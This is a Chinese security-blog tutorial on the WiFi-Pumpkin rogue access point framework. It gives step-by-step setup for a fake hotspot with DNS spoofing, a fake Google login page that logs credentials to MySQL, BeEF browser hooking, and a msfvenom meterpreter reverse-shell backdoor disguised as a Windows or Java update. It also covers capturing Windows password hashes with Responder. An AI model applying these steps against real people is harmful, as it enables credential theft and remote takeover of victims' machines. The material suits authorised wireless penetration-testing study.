*****本文原创作者：blacksunny，本文属FreeBuf原创奖励计划，未经许可禁止转载****

## 描述

 **WiFi-Pumpkin是一款专用于无线环境渗透测试的完整框架，利用该工具可以伪造接入点完成中间人攻击，同时也支持一些其他的无线渗透测试功能。旨在提供更安全的无线网络服务，该工具可以用来监听目标的流量数据，通过无线钓鱼的方式来捕获不知情的用户，以此来达到监控目标用户数据流量的目的。**

## 主要功能

>   1. Rouge WiFi Access Point
>
>   2. Deauth Attack Clients AP
>
>   3. Probe Request Monitor
>
>   4. DHCP Starvation Attack
>
>   5. Credentials Monitor
>
>   6. Transparent Proxy
>
>   7. Windows Update Attack
>
>   8. Phishing Manager
>
>   9. Partial Bypass HSTS protocol
>
>   10. Support beef hook
>
>   11. ARP Poison
>
>   12. DNS Spoof
>
>   13. Patch Binaries via MITM
>
>   14. Karma Attack (supporthostapd-mana)
>
>   15. LLMNR,NBT-NS and MDNSpoisoner(Responder)
>
>   16. Pumpkin-Proxy(ProxyServer(mitmproxyAPI))
>
>   17. Capture images on the fly
>
>   18. TCP-Proxy(with scapy)
>
>

## 插件

Plugin| Description  
---|---  
Dns2proxy| This tools offer a deffierent features for post-explotation once
you change the DNS server to a Victim.  
Sslstrip2| Sslstrip is a MITM tool that implements Moxie Marlinspike’s SSL
stripping attacks based version fork  
Sergio-proxy| Sergio Proxy(a Super Effective Recorder of Gathered inputs and
Outputs) is an HTTP proxy that was written in Python for the Twisted
framework.  
BDFProxy-ng| Patch Binaries via MITM: BackdoorFactory + mitmProxy, bdfproxy-ng
is a fork and review of the original BDFProxy.  
Responder| Responder an LLMNR, NBT-NS and MDNS poisoner.  
  
### Transparent Proxy:

TransparentProxy可以允许用户拦截/修改流量信息，同时可以实现目标页面的javascripts注入，也可以轻松实现模块化注入并创建一个Python文件（plugins/extension/目录下）,最后在PumpProxy（标签）下显示信息。

![Transparent
Proxy.jpg](https://image.3001.net/images/20170622/1498093083736.jpg!small)

### TCP-Proxy Server

在TCP stream中你可以设置一个代理。它可以通过scapy模块过滤请求和响应流并且主动修改TCP
protocol的数据包来获得拦截。这插件使用模块来view或者modify这拦截数据，仅仅加你的自定义模块在”plugins/analyzers/”,自动被列举在TCP-Proxy标签。

## 安装WiFi-Pumpkin

>   1. git clone <https://github.com/P0cL4bs/WiFi-Pumpkin.git>
>
>   2. pip install –r requirements.txt
>
>   3. ./installer.sh –install
>
>   4. 运行WiFi-Pumpkin:python wifi-pumpkin.py
>
>

## 创建钓鱼页面

### 设置MYSQL

>   1. /etc/init.d/mysql start
>
>   2. Mysql –u root
>
>   3. Create database xeus;
>
>   4. Use xeus;
>
>   5. Create table logins(networkvarchar(64), email varchar(64), password
> varchar(64));
>
>

![mysql.jpg](https://image.3001.net/images/20170622/14980931226233.jpg!small)

### 下载Fake Page

>   1. git clone <https://github.com/XeusHack/Fake-Login-Page.git>
>
>   2. 将Fake-Login-Page文件放到/var/www目录下。
>
>   3. 编辑database.php文件，设置文件内容：
>
>

  

`$username = “root”;`

``

`$password = “”;`

``

`$db_name = “xeus”;`

``

`$tbl_name = “logins”;`

``

  

这里设置的内容根据自己的环境而设定，我这里是我的环境。

重启mysql:/etc/init.d/mysql restart

### 设置WiFi-Pumpkin

运行WiFi-Pumpkin，进入此目录下，python WiFi-Pumpkin.py

![wifi.jpg](https://image.3001.net/images/20170622/14980932175457.jpg!small)

切换到Settings命令，可以设置SSID号，我这里直接选择默认的PumpAP，信道号为11,这里我选择了Enable Wireless
Security，密码为1234567890等。注意：这里NetworkAdapter是无线网卡的名称，需要买一个无线网卡。

![wif-1.jpg](https://image.3001.net/images/20170622/1498093238389.jpg!small)

    
    
    然后往下拉，可以看到默认设置dhcp服务设置的信息，这里保持默认就行。

取消代理，在旁边Plugins点击，然后取消proxy server，如图所示。

![enable
proxy.jpg](https://image.3001.net/images/20170622/14980932513360.jpg!small)

点击Start，然后可以在手机上可以看到SSID为PumpAP的无线热点。可以看到是加密状态，输入设置的密码;1234567890,就可以连接上。

![shouji.jpg](https://image.3001.net/images/20170622/14980933808705.jpg!small)

然后点击Modules选项下的DNS Spoofer，进入页面，以DNSSpoof默认域名example.com为例，点击Start Attack。使DNS
SpoofRunning…

![dns
spoofer.jpg](https://image.3001.net/images/20170622/14980934439435.jpg!small)

选择PhishingManager模块，选择Options里面的index.html，点击StartServer。然后在手机客户端连接上PumpAP无线热点后，输入example.com域名后，出现了设置的信息。

![shouji-example.jpg](https://image.3001.net/images/20170622/14980934554673.jpg!small)

然后选择SetDirectory，如图所示，将上面设置的Fake-Login-Page路径设置到SetEnv
PATH里面，然后点击StartServer。可以看到在手机客户端里面出现的相关伪造的页面。

![set-Diractoy.jpg](https://image.3001.net/images/20170622/14980935019677.jpg!small)

在上面的伪造google页面输入邮箱和密码之后，然后进入mysql的logins表中，可以看到相关的信息。

![fake-google.jpg](https://image.3001.net/images/20170622/14980935259454.jpg!small)

### Beef配合攻击

在/usr/share/beef-xss目录下运行./beef。如图所示。选择其中的Hook URL。

![beef.jpg](https://image.3001.net/images/20170622/14980936141306.jpg!small)

然后<http://127.0.0.1:3000/ui/authentication>登陆beef，默认账号和密码都是beef。

按照上面设置PumpAP无线热点过程，进入到Phishing Manager模块，选中按照如图所示进行设置。

![beef-phishing.jpg](https://image.3001.net/images/20170622/14980937016196.jpg!small)

然后点击StartServer运行，然后在手机客户端连接上PumpAP无线热点，然后打开example.com域名。在beef页面会出现受攻击的机器。然后可以通过beef进入深入攻击了。

![beef-1.jpg](https://image.3001.net/images/20170622/14980937097809.jpg!small)

### 反弹shell

生成一个shellcode后门，利用msfvenom命令：mefvenom –pwindows/meterpreter/reverse_tcp
lhost=你的本机IP地址 lport=4444 –f exe –o windowsupdate.exe进入msfconsole界面，等待shell连接。

![msfconsole.jpg](https://image.3001.net/images/20170622/14980938322239.jpg!small)

按照设置WiFi-Pumokin，进入DNS
Spoofer界面，然后删除DNS:spoof；里面的example.com，然后自己填入一个域名（我这里依然选择example.com）,这里注意一定要删除之前的example.com，要不会占用一个端口，后面操作不会成功的。

![dns--111.jpg](https://image.3001.net/images/20170622/1498093851418.jpg!small)

在DNS spoofer页面选择Fake
Update，进入此页面，然后将自己生产的shellcode后门加入该路径，这里可以选择WindowsUpdate或者Java
Update更新，Network Adapter要选择wlan0,自己的无线网卡。

![wifi-wpdate.jpg](https://image.3001.net/images/20170622/14980939186830.jpg!small)

然后在目标机器连接到我的伪造的PumpAP无线热点，输入example.com域名。可以进入上面选择的伪造页面。

![windowsupdate.jpg](https://image.3001.net/images/20170622/14980939423713.jpg!small)

javaUpdate页面如下图所示。

![javaupdate.jpg](https://image.3001.net/images/20170622/14980939798144.jpg!small)

如果被攻击者电脑下载了我们的后门，安装了后门。那么我们就可以在kali里面获取它的电脑权限。

![meterpreter.jpg](https://image.3001.net/images/20170622/14980940526221.jpg!small)

### Stealing Accouts Password Hashes

运行WiFi-Pumpkin程序，在界面上Advanced Mode:Monitor MITM Attack选择Responder。如图所示。

![responder.jpg](https://image.3001.net/images/20170622/14980940654858.jpg!small)

然后在Plugins选择Responder，并且关闭Enable proxy
server.可以在change打开配置页面。（一般默认就好，也可以根据自己想要抓取的选择开启和关闭），如图所示。

![responder-1.jpg](https://image.3001.net/images/20170622/14980940833327.jpg!small)

![change.jpg](https://image.3001.net/images/20170622/14980940973084.jpg!small)

我们主要的目的是抓取windows的账号和密码，在目标机器上运行此操作，就会在wifi-pumpkin的responder显示出目标机的用户名和hash密码。

![buhuobao.jpg](https://image.3001.net/images/20170622/14980941802164.jpg!small)

总结：

上面的主要是参考部分文章然后自己来验证的，参考文章如下：

<http://www.freebuf.com/articles/network/137159.html>

<https://github.com/P0cL4bs/WiFi-Pumpkin>

 ** ***本文原创作者：blacksunny，本文属FreeBuf原创奖励计划，未经许可禁止转载****

